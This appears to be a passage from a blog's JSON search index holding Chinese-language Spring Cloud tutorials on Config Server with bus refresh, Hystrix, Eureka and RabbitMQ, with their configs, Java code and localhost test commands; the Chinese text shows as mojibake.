eureka: client: service-url: defaultZone: http://localhost:7000/eureka/ # ä»Šå¤©å†™defalutZoneå†™é”™äº†ï¼Œå‘ç°åº”ç”¨åœ¨è¯·æ±‚loclahost:8761/eureka/,åŸæ¥é»˜è®¤å€¼æ˜¯è¿™ä¸ª@EnableConfigServer @SpringBootApplication @EnableConfigServer // å¼€å¯config-server public class CloudConfigServerApplication { public static void main(String[] args) { SpringApplication.run(CloudConfigServerApplication.class, args); } }æµ‹è¯• curl http://localhost:12000/config-dev.yml currency: name: huskyui-update-2020-03-24-----2config-clientpom &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-config&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--spring-cloud-version Hoxton.SR3--&gt;bootstrap.yml bootstrap.ymlä¼˜å…ˆäºapplication.ymlé…ç½® spring: cloud: config: label: master # ç”¨äºæ‹‰å–è¿œç¨‹é…ç½®å±æ€§çš„æ ‡ç­¾åç§°ï¼Œåœ¨åŸºäºgitçš„æœåŠ¡å™¨ï¼Œé€šå¸¸æ˜¯master name: config # Name of application used to fetch remote properties. å¯¹åº”config-dev.ymlä¸­çš„config profile: dev # The default profile to use when fetching remote configuration discovery: enabled: true #Flag to indicate that config server discovery is enabled service-id: config-server #Service id to locate config server.ä¹Ÿå°±æ˜¯config-serveræ³¨å†Œåœ¨eurekaä¸­çš„application-name eureka: client: service-url: defaultZone: http://localhost:7000/eureka/application.yml spring: application: name: config-git server: port: 13000 management: endpoints: web: exposure: include: refresh # æ”¾å¼€/actuator/refreshè·¯å¾„ï¼Œå…·ä½“æ˜¯ä»€ä¹ˆæ ·å¼çš„è¯·æ±‚ï¼Œè¿˜å¾—çœ‹æ–‡æ¡£HelloController @RestController /** * Convenience annotation to put a &lt;code&gt;@Bean&lt;/code&gt; definition in * {@link org.springframework.cloud.context.scope.refresh.RefreshScope refresh scope}. * Beans annotated this way can be refreshed at runtime and any components that are using * them will get a new instance on the next method call, fully initialized and injected * with all dependencies. åœ¨è°ƒç”¨/actuator/refreshæ—¶ï¼Œè¿è¡ŒæœŸé—´ï¼Œè¿™ä¸ªbeanä¼šè¢«åˆ·æ–° */ @RefreshScope public class HelloController { @Value(&quot;${currency.name:error}&quot;) private String name; @RequestMapping(&quot;/hello&quot;) public String name(){ return name; } }æµ‹è¯• 1.æµ‹è¯•å•ä¸ªåº”ç”¨åˆ·æ–° æ‰“åŒ…è¿è¡Œ æµ‹è¯•å½“å‰æ•°æ®é—®é¢˜ curl localhost:13000/hello huskyui-update-2020-03-24-----2 æ›´æ–°æ•°æ® æ›´æ–°æ•°æ®config-devé‡Œé¢çš„æ•°æ® currency: name: huskyui-update-2020-03-27 å¹¶æäº¤åˆ°è¿œç¨‹ä»“åº“ è°ƒç”¨åˆ·æ–°æ¥å£ curl -X POST localhost:13000/actuator/refresh [&quot;currency.name&quot;,&quot;config.client.version&quot;] curl localhost:13000/hello huskyui-update-2020-03-27 å¯ä»¥çœ‹åˆ°æ•°æ®åˆ·æ–°æˆåŠŸ 2.æµ‹è¯•å¤šä¸ªåº”ç”¨åˆ·æ–° java -jar xxx.jar --server.port=13000 java -jar xxx.jar --server.port=13001 curl localhost:13000/hello huskyui-update-2020-03-27 curl localhost:13001/hello huskyui-update-2020-03-27 æ›´æ–°æ•°æ®config-dev.yml currency: name: huskyui-update-2020-03-27-for-two-client-test2 å¹¶æäº¤åˆ°è¿œç¨‹ä»“åº“ curl localhost:13000/hello huskyui-update-2020-03-27 curl localhost:13001/hello huskyui-update-2020-03-27 ä¸‹é¢æ‰§è¡Œåˆ·æ–°æ“ä½œ curl -X POST localhost:13000/actuator/refresh [&quot;currency.name&quot;,&quot;config.client.version&quot;] curl localhost:12000/config-dev.yml currency: name: huskyui-update-2020-03-27-for-two-client-test2 curl localhost:13000/hello huskyui-update-2020-03-27-for-two-client-test2 curl localhost:13001/hello huskyui-update-2020-03-27 curl -X POST localhost:13001/actuator/refresh [&quot;currency.name&quot;,&quot;config.client.version&quot;] curl -X POST localhost:13001/hello huskyui-update-2020-03-27-for-two-client-test2 å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœé…ç½®æ–‡ä»¶æ›´æ–°æ—¶ï¼Œ/actuator/refreshåªæ˜¯é’ˆå¯¹å•ä¸ªåº”ç”¨çš„ï¼Œå¦‚æœéœ€è¦æ›´æ–°æ‰€æœ‰åº”ç”¨éœ€è¦åˆ†åˆ«æ˜¯å»åˆ·æ–°å¯¹åº”çš„åº”ç”¨ä½¿ç”¨spring-cloud-buså®ç°ç¾¤ä½“åˆ·æ–° [å¤–é“¾å›¾ç‰‡è½¬å­˜å¤±è´¥,æºç«™å¯èƒ½æœ‰é˜²ç›—é“¾æœºåˆ¶,å»ºè®®å°†å›¾ç‰‡ä¿å­˜ä¸‹æ¥ç›´æ¥ä¸Šä¼ (img-jeIW5krD-1585555116625)(https://s1.ax1x.com/2020/03/30/GmFm2n.jpg)] ä»ä¸Šé¢çš„æ¶æ„å›¾ï¼Œæˆ‘ä»¬ config-server å’Œ config-client éƒ½è®¢é˜…ä¸€ä¸‹RabbitMQ æˆ‘ä»¬éœ€è¦ä¿®æ”¹åŸæ¥çš„ config-server POM &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-bus&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-stream-binder-rabbit&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt;application.ymlæ·»åŠ  spring: rabbitmq: host: localhost port: 5672 username: guest password: guest ## ä¸Šè¿°æ˜¯RabbitMQç›¸å…³è¿æ¥å‚æ•°ï¼Œæ¼äº†ä¸€ä¸ªvhost management: endpoints: web: exposure: include: &quot;*&quot; ## æ”¾å¼€/actuator/bus-refreshconfig-client ä¿®æ”¹éƒ¨åˆ†ä¹Ÿå’Œä¸Šè¿°ä¸€æ · ä¿®æ”¹åï¼Œå¯åŠ¨config-server,å¹¶å¯åŠ¨ä¸¤å°config-client,ç«¯å£ä¸åŒï¼ˆâ€“server.port=different_portï¼‰ æˆ‘ä»¬è®¿é—® http://localhost:15672/ è®¿é—®RabbitMQå®¢æˆ·ç«¯ï¼Œç‚¹å‡»exchange,å¯ä»¥çœ‹åˆ°æ˜¯ springCloudBus ,æ˜¯topicç±»å‹,ä¸‰ä¸ªç»‘å®šè¯¥exchangeçš„queueçš„routing keyéƒ½æ˜¯#ï¼Œä¹Ÿå°±æ˜¯ä¸å¤„ç†fanout æµ‹è¯• é¦–å…ˆä¿®æ”¹config-repo,å¹¶æäº¤ é¦–å…ˆæŸ¥çœ‹æ•°æ® D:\\gitclonepackage\\cloud&gt;curl localhost:13000/hello huskyui-update-2020-03-30 D:\\gitclonepackage\\cloud&gt;curl localhost:13001/hello huskyui-update-2020-03-30 è°ƒç”¨åˆ·æ–°æ“ä½œ curl -X POST localhost:12000/actuator/bus-refresh è¿™ä¸ªè¯·æ±‚çš„æ—¶å€™ï¼Œæ˜¯è¯·æ±‚config-server;å½“ç„¶ä¹Ÿå¯ä»¥è¯·æ±‚config-clientçš„bus-refresh D:\\gitclonepackage\\cloud&gt;curl localhost:13001/hello huskyui-update-2020-03-30-last-commit D:\\gitclonepackage\\cloud&gt;curl localhost:13000/hello huskyui-update-2020-03-30-last-commitæœ¬ç¯‡æ–‡ç« å‚è€ƒï¼š [ Spring Cloudï¼ˆä¸ƒï¼‰ï¼šé…ç½®ä¸­å¿ƒï¼ˆGit ç‰ˆä¸åŠ¨æ€åˆ·æ–°ï¼‰ ](https://windmt.com/2018/04/19/spring-cloud-7-config-sample/)[ Spring Cloudï¼ˆå…«ï¼‰ï¼šé…ç½®ä¸­å¿ƒï¼ˆæœåŠ¡åŒ–ä¸é«˜å¯ç”¨ï¼‰ ](https://windmt.com/2018/04/19/spring-cloud-8-config-with-eureka/) Spring Cloudï¼ˆä¹ï¼‰ï¼šé…ç½®ä¸­å¿ƒï¼ˆæ¶ˆæ¯æ€»çº¿ï¼‰ã€Finchley ç‰ˆã€‘","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"},{"name":"spring cloud","slug":"spring-cloud","permalink":"http://yoursite.com/tags/spring-cloud/"}]},{"title":"SpringCloud-Hystrix","slug":"SpringCloud-Hystrix","date":"2020-03-24T08:22:18.000Z","updated":"2020-11-14T17:10:42.609Z","comments":true,"path":"2020/03/24/SpringCloud-Hystrix/","link":"","permalink":"http://yoursite.com/2020/03/24/SpringCloud-Hystrix/","excerpt":"","text":"HystrixHystrix is a latency and fault tolerance library designed to isolate points ofaccess to remote systems, services and 3rd party libraries, stop cascadingfailure and enable resilience in complex distributed systems where failure isinevitable. Hystrixæ˜¯ä¸€ä¸ªå»¶è¿Ÿå’Œå®¹é”™åº“ï¼Œæ—¨åœ¨éš”ç¦»è¿œç¨‹ç³»ç»Ÿã€æœåŠ¡å’Œç¬¬ä¸‰æ–¹åº“çš„è®¿é—®ç‚¹ï¼Œåœæ­¢æ¬¡çº§æ•…éšœï¼Œå¹¶ä¸”ä¸å¯é¿å…çš„å¤æ‚åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å®ç°è‡ªæˆ‘æ¢å¤èƒ½åŠ›ã€‚ é…ç½®hystrixpom &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.67&lt;/version&gt; &lt;/dependency&gt; &lt;!--web--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--Eureka client --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- Hystrix --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!-- å£°æ˜æ€§RESTå®¢æˆ·ç«¯ï¼Œä½¿ç”¨æ³¨è§£ä¿®é¥°æ¥å£ï¼ŒåŠ¨æ€å®ç° --&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--ä¸ºäº†åç»­æ”¾å¼€hystrix.streamè·¯å¾„--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt;application.yml spring: application: name: eureka-consumer-feign-hystrix # å½“å‰åº”ç”¨åç§° eureka: client: service-url: defaultZone: http://localhost:7000/eureka/ # æ˜ å°„åˆ°Eureka serverçš„è·¯å¾„ server: port: 9001 feign: hystrix: enabled: true # an OpenFeign client will be wrapped with a Hystrix circuit breaker # ä¸€ä¸ªOpenFeignå®¢æˆ·ç«¯å°†åŒ…è£…æœ‰Hystrixæ–­è·¯å™¨ management: endpoints: web: exposure: include: hystrix.stream # ä¸ºäº†ç»™Hystrix Dashboardæä¾›ä½¿ç”¨å¯åŠ¨ç±»é…ç½® @EnableFeignClients //æ‰«æåŒ…ä¸‹è¢«@FeignClientæ³¨è§£çš„ï¼Œéœ€è¦å’Œ@ConfigurationåŒæ—¶ä½¿ç”¨ @EnableHystrix //å¼€å¯æ–­è·¯å™¨ï¼Œå¹¶ä¸”è‡ªåŠ¨é…ç½®æ‰¾åˆ°Hystrixç±»ï¼ˆif they are availableï¼‰ @SpringBootApplication public class CloudConsumerFeignHystrixApplication { public static void main(String[] args) { SpringApplication.run(CloudConsumerFeignHystrixApplication.class, args); } }è¿œç¨‹è°ƒç”¨ @Component // nameï¼š the service id with optional protocol prefix.å¸¦æœ‰å¯é€‰åè®®å‰ç¼€çš„æœåŠ¡ID // fallbackï¼š æŒ‡å®šçš„Feignå®¢æˆ·ç«¯æ¥å£çš„åå¤‡ç±»ã€‚fallbackç±»å¿…é¡»å®ç°è¯¥æ¥å£å¹¶ä¸”æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„spring bean //Fallback class for the specified Feign client interface. The fallback class must // implement the interface annotated by this annotation and be a valid spring bean. @FeignClient(name = &quot;eureka-producer&quot;,fallback = HelloRemoteHystrix.class) public interface HelloRemote { @RequestMapping(&quot;/hello&quot;) String hello(@RequestBody JSONObject requestJSON); }fallbackç±» @Component public class HelloRemoteHystrix implements HelloRemote { @Override public String hello(JSONObject requestJSON) { return &quot;hello world&quot;; } }controller @RestController public class HelloController { @Resource private HelloRemote helloRemote; @RequestMapping(&quot;/hello/{name}&quot;) public String hello(@PathVariable(name = &quot;name&quot;)String name){ JSONObject requestJSON = new JSONObject(); requestJSON.put(&quot;name&quot;,name); return helloRemote.hello(requestJSON); } }æµ‹è¯• å°†eureka-serverï¼Œproducerï¼Œfeign-hystrixä¸‰ä¸ªé¡¹ç›®å¯åŠ¨ï¼Œåœ¨eureka-serverä¸Šå¯ä»¥çœ‹åˆ°producerå’Œfeign-hystrixéƒ½å·²ç»æ³¨å†ŒæˆåŠŸã€‚ è®¿é—®ï¼šlocalhost:9001/hello/huskyui hello, huskyui Tue Mar 24 14:34:44 CST 2020 å°†producerå…³é—­ è®¿é—®ï¼šlocalhost:9001/hello/huskyui hello world å†æ¬¡å°†producerå¯åŠ¨ hello, huskyui Tue Mar 24 14:40:27 CST 2020 è¿™è¾¹ï¼Œå¯ä»¥çœ‹åˆ°ç†”æ–­èƒ½åŠ›ï¼Œä»¥åŠè‡ªæˆ‘æ¢å¤èƒ½åŠ›é…ç½®ä¸€ä¸ªHystrix dashboardpom &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-hystrix-dashboard&lt;/artifactId&gt; &lt;/dependency&gt;application.yml spring: application: name: hystrix-dashboard server: port: 11000æ·»åŠ æ³¨è§£@EnableHystrixDashboard @SpringBootApplication @EnableHystrixDashboard public class CloudHystrixDashboardApplication { public static void main(String[] args) { SpringApplication.run(CloudHystrixDashboardApplication.class, args); } }æµ‹è¯• è¿è¡Œè¯¥é¡¹ç›® è®¿é—®ï¼š http://localhost:11000/hystrix åœ¨å¯åŠ¨åè¾“å…¥http://localhost:9001/actuator/hystrix.stream 9001æ˜¯feign-hystrixçš„é¡¹ç›®çš„ç«¯å£ï¼Œå½“æ—¶æˆ‘ä»¬å¼•å…¥äº†actuatorï¼Œå¼€æ”¾hystrix.stream å¯ä»¥çœ‹åˆ°dashboardç›¸å…³","categories":[],"tags":[]},{"title":"SpringCloud-Eureka","slug":"SpringCloud-Eureka","date":"2020-03-20T08:53:22.000Z","updated":"2020-11-14T17:10:43.145Z","comments":true,"path":"2020/03/20/SpringCloud-Eureka/","link":"","permalink":"http://yoursite.com/2020/03/20/SpringCloud-Eureka/","excerpt":"","text":"categories: springcloudEurekaç®€ä»‹Eurekaæ˜¯ä¸€ç§åŸºäºREST(Representational StateThransferè¡¨ç°å±‚çŠ¶æ€è½¬ç§»)çš„æœåŠ¡ï¼Œä¸»è¦ç”¨äºAWSçš„å®šä½æœåŠ¡ï¼Œä»¥ä¾¿å®ç°ä¸­é—´å±‚æœåŠ¡å™¨çš„è´Ÿè½½å‡è¡¡å’Œæ•…éšœè½¬ç§»ã€‚ å•ä¸ªæ³¨å†Œä¸­å¿ƒæ•´åˆpomé…ç½®&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;application.ymlspring: application: name: eureka-server server: port: 7000 # Server HTTP port. eureka: instance: hostname: localhost # eurekaå®ä¾‹çš„hostname client: register-with-eureka: false # æŒ‡ç¤ºå½“å‰å®ä¾‹æ˜¯å¦åº”åœ¨eurekaæœåŠ¡å™¨ä¸Šæ³¨å†Œå…¶ä¿¡æ¯ä»¥ä¾›å‘ç° fetch-registry: false # æŒ‡ç¤ºå½“å‰å®ä¾‹æ˜¯å¦ä»eurekaæœåŠ¡å™¨è·å–æ³¨å†Œè¡¨ä¿¡æ¯ service-url: # æ˜ å°„mapã€‚æ˜ å°„å…³äºeurekaæœåŠ¡å™¨çš„urlåˆ—è¡¨ï¼Œmapçš„valueå€¼å¯ä»¥æ˜¯å•ä¸ªurlï¼Œä¹Ÿå¯ä»¥æ˜¯ä»¥,åˆ†å‰²ç¬¦åˆ†å‰²çš„å¤šä¸ªurlï¼Œä¿®æ”¹ä¹‹åç”Ÿæ•ˆæ—¶é—´å°†åœ¨ä¸‹ä¸€ä¸ªå¾ªç¯ä¸­ï¼Œç”±eurekaServiceUrlPollIntervalSecondsæŒ‡å®š defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/æ³¨è§£@EnableEurekaServer@EnableEurekaServer // Annotation to activate Eureka Server related configuration. æ¿€æ´»eurekaç›¸å…³é…ç½®çš„æ³¨è§£ @SpringBootApplication public class EurekaServerApplication { public static void main(String[] args) { SpringApplication.run(EurekaServerApplication.class, args); } }æ‰“åŒ…éƒ¨ç½²è¿è¡Œmvn clean package -Dmaven.test.skip=true java -jar xxx.jar è®¿é—® localhost:7000æ³¨å†Œä¸¤ä¸ªæ³¨å†Œä¸­å¿ƒä¿®æ”¹application.yamlé…ç½®æ–‡ä»¶## æ–°å¢ä¸¤ä¸ªé…ç½®æ–‡ä»¶ ## application-peer1.yml spring: application: name: eureka-server server: port: 7001 # Server HTTP port. eureka: instance: hostname: localhost # eurekaå®ä¾‹çš„hostname client: register-with-eureka: true # æŒ‡ç¤ºå½“å‰å®ä¾‹æ˜¯å¦åº”åœ¨eurekaæœåŠ¡å™¨ä¸Šæ³¨å†Œå…¶ä¿¡æ¯ä»¥ä¾›å‘ç° fetch-registry: true # æŒ‡ç¤ºå½“å‰å®ä¾‹æ˜¯å¦ä»eurekaæœåŠ¡å™¨è·å–æ³¨å†Œè¡¨ä¿¡æ¯ service-url: # æ˜ å°„mapã€‚æ˜ å°„å…³äºeurekaæœåŠ¡å™¨çš„urlåˆ—è¡¨ï¼Œmapçš„valueå€¼å¯ä»¥æ˜¯å•ä¸ªurlï¼Œä¹Ÿå¯ä»¥æ˜¯ä»¥,åˆ†å‰²ç¬¦åˆ†å‰²çš„å¤šä¸ªurlï¼Œä¿®æ”¹ä¹‹åç”Ÿæ•ˆæ—¶é—´å°†åœ¨ä¸‹ä¸€ä¸ªå¾ªç¯ä¸­ï¼Œç”±eurekaServiceUrlPollIntervalSecondsæŒ‡å®š defaultZone: http://127.0.0.1:7002/eureka/ ## application-peer2.yml spring: application: name: eureka-server server: port: 7002 # Server HTTP port. eureka: instance: hostname: localhost # eurekaå®ä¾‹çš„hostname client: register-with-eureka: true # æŒ‡ç¤ºå½“å‰å®ä¾‹æ˜¯å¦åº”åœ¨eurekaæœåŠ¡å™¨ä¸Šæ³¨å†Œå…¶ä¿¡æ¯ä»¥ä¾›å‘ç° fetch-registry: true # æŒ‡ç¤ºå½“å‰å®ä¾‹æ˜¯å¦ä»eurekaæœåŠ¡å™¨è·å–æ³¨å†Œè¡¨ä¿¡æ¯ service-url: # æ˜ å°„mapã€‚æ˜ å°„å…³äºeurekaæœåŠ¡å™¨çš„urlåˆ—è¡¨ï¼Œmapçš„valueå€¼å¯ä»¥æ˜¯å•ä¸ªurlï¼Œä¹Ÿå¯ä»¥æ˜¯ä»¥,åˆ†å‰²ç¬¦åˆ†å‰²çš„å¤šä¸ªurlï¼Œä¿®æ”¹ä¹‹åç”Ÿæ•ˆæ—¶é—´å°†åœ¨ä¸‹ä¸€ä¸ªå¾ªç¯ä¸­ï¼Œç”±eurekaServiceUrlPollIntervalSecondsæŒ‡å®š defaultZone: http://127.0.0.1:7001/eureka/æ‰“åŒ…éƒ¨ç½²// æ‰“åŒ… mvn clean package -Dmaven.test.skip=true // è¿è¡Œ java -jar xxx.jar --spring.profiles.active=peer1 java -jar xxx.jpg --spring.profiles.active=peer2 // è®¿é—® localhost:7001 localhost:7002æœåŠ¡æä¾›å’Œè°ƒç”¨ç”Ÿæˆè€…pom&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.67&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;application.ymlspring: application: name: eureka-producer eureka: client: service-url: defaultZone: http://127.0.0.1:7000/eureka/ server: port: 8000å…·ä½“æ–¹æ³•@RestController public class HelloController { @RequestMapping(&quot;/hello&quot;) public String hello(@RequestBody JSONObject requestJSON) { String name = requestJSON.getString(&quot;name&quot;); return &quot;hello, &quot; + name + &quot; &quot; + new Date(); } }æ‰“åŒ…éƒ¨ç½²æµ‹è¯•mvn clean package -Dmaven.test.skip=true java -jar xxx.jar curl -H&apos;Content-Type: application/json&apos; -d&apos;{&quot;name&quot;:&quot;huskyui&quot;}&apos; localhost:8000/hello hello, huskyui Fri Mar 20 16:06:40 CST 2020æ¶ˆè´¹è€…pom&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;fastjson&lt;/artifactId&gt; &lt;version&gt;1.2.67&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt;application.ymlspring: application: name: eureka-consumer eureka: client: service-url: defaultZone: http://localhost:7000/eureka/ server: port: 9000æ·»åŠ @EnableFeignClients@EnableFeignClients @SpringBootApplication public class CloudEurekaConsumerApplication { public static void main(String[] args) { SpringApplication.run(CloudEurekaConsumerApplication.class, args); } }å…·ä½“ä»£ç @FeignClient(name = &quot;eureka-producer&quot;) public interface HelloRemote { @RequestMapping(&quot;/hello&quot;) String hello(@RequestBody JSONObject requestJSON); } @RestController public class HelloController { @Autowired private HelloRemote helloRemote; @RequestMapping(&quot;/hello/{name}&quot;) public String index(@PathVariable(&quot;name&quot;)String name){ JSONObject requestJSon = new JSONObject(); requestJSon.put(&quot;name&quot;,name); return helloRemote.hello(requestJSon); } }æ‰“åŒ…éƒ¨ç½²æµ‹è¯•mvn clean package -Dmaven.test.skip=true java -jar xxx.jar curl localhost:9000/hello/huskyui hello, huskyui Fri Mar 20 16:11:59 CST 2020è´Ÿè½½å‡è¡¡å¯åŠ¨ä¸¤ä¸ªä¸åŒç«¯å£çš„ç”Ÿäº§è€…ï¼Œå¯åŠ¨ä¸€ä¸ªæ¶ˆè´¹è€…ä¼šå®ç°ç›¸å…³æ•ˆæœ","categories":[],"tags":[{"name":"spring","slug":"spring","permalink":"http://yoursite.com/tags/spring/"},{"name":"spring cloud","slug":"spring-cloud","permalink":"http://yoursite.com/tags/spring-cloud/"}]},{"title":"SpringBootæ•´åˆRabbitMQ","slug":"SpringBootæ•´åˆRabbitMQ","date":"2020-03-19T06:14:26.000Z","updated":"2020-11-14T17:10:43.827Z","comments":true,"path":"2020/03/19/SpringBootæ•´åˆRabbitMQ/","link":"","permalink":"http://yoursite.com/2020/03/19/SpringBoot%E6%95%B4%E5%90%88RabbitMQ/","excerpt":"","text":"SpringBooté…ç½®RabbitMQé…ç½®maven&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-amqp&lt;/artifactId&gt; &lt;/dependency&gt;é…ç½®æ–‡ä»¶application.ymlspring: rabbitmq: username: user_mmr #ç”¨æˆ·å password: 123 #å¯†ç  host: localhost # ä½ è¦è¿æ¥çš„RabbitMQçš„host port: 5672 # Rabbitçš„port virtual-host: &apos;/vhost_mmr&apos; #virtual-hostRabbitMQæ•™ç¨‹ä»¥ä¸‹æ•™ç¨‹éƒ½å¯ä»¥åœ¨RabbitMQåœ¨githubçš„ä»“åº“ rabbitmq-tutorial ä¸­æ‰¾åˆ°ï¼Œå…·ä½“springbootåœ¨ spring- amqp æ¨¡å—ä¸­ã€‚åœ¨è¿™é‡Œé¢è¦è®²ä¸€ä¸‹å¦‚ä½•è¿è¡Œç›¸å…³ä»£ç  ### æ‰“åŒ…é¡¹ç›® mvn clean package ### è¿è¡Œé¡¹ç›® java -jar xxx.jar --spring.profiles.active=tut1,sender ### ä¸‹é¢æ”¾ä¸Šç›¸å…³è¿è¡Œå‘½ä»¤ System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=hello-world,receiver&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=hello-world,sender&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=work-queues,receiver&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=work-queues,sender&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=pub-sub,receiver&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=pub-sub,sender&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=routing,receiver&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=routing,sender&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=topics,receiver&quot;); System.out.println(&quot;java -jar rabbit-tutorials.jar --spring.profiles.active=topics,sender&quot;); #### æ³¨æ„ï¼Œè¯¥é¡¹ç›®ä½¿ç”¨äº†å®šæ—¶ä»»åŠ¡ ä½ éœ€è¦é…ç½®å…è®¸å®šæ—¶è°ƒåº¦çš„æ³¨è§£ @EnableSchedulinghelloworld@Profile({&quot;tut1&quot;,&quot;hello-world&quot;}) @Configuration public class Tut1Config { @Bean public Queue hello(){ return new Queue(&quot;hello&quot;); } @Profile(&quot;receiver&quot;) @Bean public Tut1Receiver receiver(){ return new Tut1Receiver(); } @Profile(&quot;sender&quot;) @Bean public Tut1Sender sender(){ return new Tut1Sender(); } } // ç›‘å¬helloé˜Ÿåˆ— Annotation that marks a method to be the target of a Rabbit message listener on the // specified queues()æˆ–è€…bindings(). @RabbitListener(queues = &quot;hello&quot;) public class Tut1Receiver { private static final Logger logger = LoggerFactory.getLogger(Tut1Receiver.class); // Annotation that marks a method to be the target of a Rabbit message // listener within a class that is annotated with {@link RabbitListener} @RabbitHandler public void receive(String in) { logger.info(&quot;[x] Received:{} &quot;, in); System.out.println(&quot;[x] Received:{} &quot;+ in); } } public class Tut1Sender { private final static Logger logger = LoggerFactory.getLogger(Tut1Sender.class); @Autowired private RabbitTemplate rabbitTemplate; @Autowired private Queue queue; @Scheduled(fixedDelay = 1000, initialDelay = 500) public void send() { String msg = &quot;hello world&quot;; this.rabbitTemplate.convertAndSend(queue.getName(), msg); logger.info(&quot;[x] sent :&quot; + msg); System.out.println(&quot;[x] sent :&quot; + msg); } } // java -jar xxx.jar --spring.profiles.active=hello-world,receiver // java -jar xxx.jar --spring.profiles.active=hello-world,senderwork-queues@RabbitListener(queues = &quot;tut.hello&quot;) public class Tut2Receiver { private final static Logger logger = LoggerFactory.getLogger(Tut2Receiver.class); private final int instance; public Tut2Receiver(int i){ this.instance = i; } @RabbitHandler public void receive(String in) throws InterruptedException{ StopWatch watch = new StopWatch(); watch.start(); logger.info(&quot;instance &quot; + this.instance+&quot;[x] recived&quot; + in); doWork(in); watch.stop(); logger.info(&quot;instance &quot; + this.instance +&quot;[x] done&quot;); } private void doWork(String in) throws InterruptedException{ for (char ch:in.toCharArray()){ if(ch == &apos;.&apos;){ TimeUnit.SECONDS.sleep(1); } 